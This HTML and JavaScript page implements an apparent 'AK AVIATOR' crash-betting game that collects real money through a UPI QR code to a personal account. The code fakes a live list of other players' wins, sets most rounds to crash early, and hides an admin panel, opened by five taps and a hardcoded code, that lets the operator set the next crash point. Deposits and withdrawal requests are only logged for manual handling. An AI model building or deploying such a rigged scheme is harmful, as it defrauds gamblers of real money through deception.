<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AK AVIATOR | Professional Crash Game</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #0b0b0e; --card: #1c1c1e; --primary: #e91a3d; --green: #28a745; --gold: #fbc02d; --text: #ffffff; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto', sans-serif; overflow: hidden; }
        
        /* Header */
        .header { background: #121212; padding: 12px 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); }
        .logo { font-size: 22px; font-weight: 900; color: var(--primary); cursor: pointer; text-shadow: 0 0 10px rgba(233,26,61,0.5); }
        .bal-box { background: #000; padding: 6px 15px; border-radius: 20px; border: 1px solid #333; font-weight: bold; color: var(--green); }

        /* Stage */
        .stage { height: 230px; background: radial-gradient(circle, #250101 0%, #000000 100%); position: relative; overflow: hidden; }
        #mult-display { position: absolute; top: 45%; left: 50%; transform: translate(-50%, -50%); font-size: 55px; font-weight: 900; z-index: 10; transition: color 0.2s; }
        #plane { position: absolute; bottom: 20px; left: 20px; width: 60px; z-index: 5; transition: transform 0.1s linear; }

        /* History */
        .history { display: flex; gap: 6px; padding: 10px; background: #050505; overflow-x: auto; white-space: nowrap; border-bottom: 1px solid #222; }
        .res-pill { background: #1c1c1e; padding: 4px 12px; border-radius: 12px; font-size: 11px; color: #aaa; border: 1px solid #333; }

        /* Top Actions */
        .action-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; padding: 10px 18px; }
        .action-btn { padding: 10px; border-radius: 8px; border: none; font-weight: bold; color: white; cursor: pointer; font-size: 12px; text-transform: uppercase; }

        /* Players List */
        .fake-players-list { height: 180px; overflow-y: hidden; padding: 0 18px; margin-bottom: 140px; }
        .p-row { display: flex; justify-content: space-between; padding: 9px 0; font-size: 12px; border-bottom: 1px solid #151515; animation: slideUp 0.5s ease; }
        
        /* Betting Box */
        .bet-box { background: var(--card); padding: 18px; border-radius: 20px 20px 0 0; position: fixed; bottom: 0; width: 100%; box-sizing: border-box; z-index: 100; box-shadow: 0 -5px 15px rgba(0,0,0,0.5); }
        .input-row { display: flex; gap: 12px; margin-bottom: 10px; }
        input { background: #000; border: 1px solid #444; color: white; padding: 14px; border-radius: 10px; width: 40%; font-size: 18px; text-align: center; outline: none; }
        .main-btn { flex-grow: 1; border-radius: 10px; border: none; font-size: 19px; font-weight: bold; color: white; background: var(--green); cursor: pointer; transition: 0.2s; }
        .main-btn.cashing { background: var(--gold); color: #000; }

        /* Modals */
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.96); z-index:1000; align-items:center; justify-content:center; }
        .modal-content { background: var(--card); width: 85%; max-height: 85vh; overflow-y: auto; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #333; }
        .qr-frame { background: white; padding: 10px; display: inline-block; border-radius: 10px; margin: 15px 0; }
        
        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="header">
    <div class="logo" id="adminTrigger">AK AVIATOR</div>
    <div class="bal-box" id="userBal">₹0.00</div>
</div>

<div class="stage">
    <div id="mult-display">1.00x</div>
    <img src="https://img.icons8.com/color/96/fighter-jet.png" id="plane" alt="Plane">
</div>

<div class="history" id="hist">
    <div class="res-pill">1.34x</div><div class="res-pill">2.10x</div><div class="res-pill">1.05x</div><div class="res-pill">5.20x</div><div class="res-pill">1.88x</div>
</div>

<div class="action-grid">
    <button class="action-btn" style="background:var(--green)" onclick="openM('depM')">Deposit</button>
    <button class="action-btn" style="background:#444" onclick="openM('withM')">Withdraw</button>
    <button class="action-btn" style="background:#555" onclick="copyInvite()">Invite</button>
</div>

<div class="fake-players-list" id="fakePlayers"></div>

<div class="bet-box">
    <div class="input-row">
        <input type="number" id="betAmt" value="100">
        <button id="mainBtn" class="main-btn" onclick="handleBet()">BET</button>
    </div>
</div>

<div id="depM" class="modal"><div class="modal-content">
    <h3>Add Money</h3>
    <input type="number" id="depAmount" placeholder="Enter Amount" oninput="genQR()" style="width:100%">
    <div id="qrArea" style="display:none;">
        <p style="font-size:12px; color:#aaa">UPI: Poonamlondhe52-1@okhdfcbank</p>
        <div class="qr-frame"><img id="qrImg" src="" width="200"></div>
        <input type="text" id="utr" placeholder="Enter 12-digit UTR" style="width:100%">
        <button class="main-btn" style="width:100%" onclick="submitDeposit()">Submit UTR</button>
    </div>
    <button class="action-btn" style="background:#333; width:100%; margin-top:10px" onclick="closeM('depM')">Close</button>
</div></div>

<div id="withM" class="modal"><div class="modal-content">
    <h3 style="color:var(--gold)">Withdraw</h3>
    <p style="font-size:11px; color:#777">Min: ₹500 | Max: ₹50,000</p>
    <input type="number" id="withAmount" placeholder="Amount (₹)" style="width:100%">
    <input type="text" id="withUpi" placeholder="Your UPI ID" style="width:100%">
    <button class="main-btn" style="width:100%" onclick="submitWithdrawal()">Request Withdraw</button>
    <button class="action-btn" style="background:#333; width:100%; margin-top:10px" onclick="closeM('withM')">Cancel</button>
</div></div>

<div id="adminM" class="modal"><div class="modal-content">
    <h3 style="color:var(--primary)">Master Control</h3>
    <input type="number" id="nextCrash" placeholder="Set Next Crash (e.g. 5.0)" style="width:100%">
    <button class="main-btn" style="background:var(--primary); width:100%" onclick="setCrash()">Set Crash</button>
    <hr style="border-color:#333">
    <p style="font-size:12px">Deposit/Withdraw Requests (Firebase)</p>
    <button class="action-btn" style="background:#333; width:100%" onclick="closeM('adminM')">Close Panel</button>
</div></div>

<script>
    // Firebase Config
    const firebaseConfig = { databaseURL: "https://my-colour-game-670af-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let uid = localStorage.getItem('AX_UID') || 'U'+Math.floor(Math.random()*9999);
    localStorage.setItem('AX_UID', uid);

    let mult = 1.00, isRunning = false, myBet = null, forced = null;

    // Aviator Engine
    // Plane hamesha randomly udata rahega
    function startRound() {
        mult = 1.00; isRunning = true;
        
        // Algorithm: Chance for 100x+, but 70% of rounds are early crash
        let crashPoint = forced || (Math.random() < 0.7 ? (Math.random()*0.9 + 1) : (Math.random()*5 + 1));
        
        let loop = setInterval(() => {
            if (mult >= crashPoint) {
                clearInterval(loop);
                endRound();
            } else {
                mult += 0.01;
                document.getElementById('mult-display').innerText = mult.toFixed(2) + "x";
                updatePlane(mult);
                if(myBet) document.getElementById('mainBtn').innerText = "CASH OUT ₹" + (myBet * mult).toFixed(2);
            }
        }, 100);
    }

    function endRound() {
        isRunning = false;
        document.getElementById('mult-display').style.color = "var(--primary)";
        document.getElementById('mult-display').innerText = "CRASHED! " + mult.toFixed(2) + "x";
        
        // Add to history
        let h = document.getElementById('hist');
        h.innerHTML = `<div class="res-pill">${mult.toFixed(2)}x</div>` + h.innerHTML;
        
        setTimeout(() => {
            document.getElementById('mult-display').style.color = "white";
            resetPlane();
            startRound();
        }, 3000);
    }

    function updatePlane(m) {
        let x = (m - 1) * 160; let y = (m - 1) * 90;
        document.getElementById('plane').style.transform = `translate(${Math.min(x, 280)}px, -${Math.min(y, 180)}px)`;
    }

    function resetPlane() {
        document.getElementById('plane').style.transform = `translate(0,0)`;
        forced = null;
        if(!myBet) document.getElementById('mainBtn').innerText = "BET";
    }

    // Dynamic QR Generator
    function genQR() {
        let amt = document.getElementById('depAmount').value;
        if(amt > 0) {
            document.getElementById('qrArea').style.display = 'block';
            let upiLink = `upi://pay?pa=Poonamlondhe52-1@okhdfcbank&pn=AK_AVIATOR&am=${amt}&cu=INR`;
            document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;
        }
    }

    // Fake Players simulation
    const pNames = ["Aman", "Priya", "Rahul", "Zoya", "Karan", "Imran"];
    setInterval(() => {
        const list = document.getElementById('fakePlayers');
        const name = pNames[Math.floor(Math.random()*pNames.length)];
        const bet = (Math.random()*1000 + 100).toFixed(0);
        const winMult = (Math.random()*2 + 1.1).toFixed(2);
        list.innerHTML = `<div class="p-row">
            <span>${name}</span><span>₹${bet}</span>
            <span class="win-amt">${winMult}x (₹${(bet*winMult).toFixed(0)})</span>
        </div>` + list.innerHTML;
        if(list.children.length > 8) list.removeChild(list.lastChild);
    }, 2500);

    // Secret Admin Access (5 Taps)
    let taps = 0;
    document.getElementById('adminTrigger').onclick = () => {
        taps++; if(taps === 5 && prompt("Code:") === "77759636477") openM('adminM');
    };
    function setCrash() { forced = document.getElementById('nextCrash').value; alert("Crash target set!"); closeM('adminM'); }

    // Helpers
    function openM(id) { document.getElementById(id).style.display='flex'; }
    function closeM(id) { document.getElementById(id).style.display='none'; }
    function copyInvite() { navigator.clipboard.writeText(window.location.href+"?ref="+uid); alert("Link Copied!"); }
    
    // Deposit/Withdraw submit
    function submitDeposit() { db.ref('admin/deposits/'+uid).set({ amt:document.getElementById('depAmount').value, utr:document.getElementById('utr').value, time:Date.now() }); alert("Submitted!"); closeM('depM'); }
    function submitWithdrawal() { db.ref('admin/withdrawals/'+uid).set({ amt:document.getElementById('withAmount').value, upi:document.getElementById('withUpi').value, time:Date.now() }); alert("Request sent!"); closeM('withM'); }

    db.ref('users/'+uid+'/balance').on('value', s => { document.getElementById('userBal').innerText = "₹" + (s.val()||0).toFixed(2); });
    startRound();
</script>
</body>
</html>
